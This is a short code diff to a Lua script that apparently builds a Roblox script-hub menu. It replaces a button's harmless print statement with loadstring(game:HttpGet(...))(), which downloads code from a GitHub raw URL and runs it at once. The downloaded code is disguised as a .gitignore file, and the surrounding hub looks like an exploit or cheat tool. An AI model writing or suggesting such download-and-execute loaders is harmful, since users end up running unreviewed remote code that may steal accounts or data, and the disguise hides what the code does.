@@ -56,5 +56,5 @@ local Hubs = Window:NewTab("Hubs")
 local HubsSection = Hubs:NewSection("Hubs")
 
 HubsSection:NewButton("Development", "A ROBLOX Hub.", function()
-    print("Clicked")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/6vmzz/E/refs/heads/main/.gitignore"))()
 end)
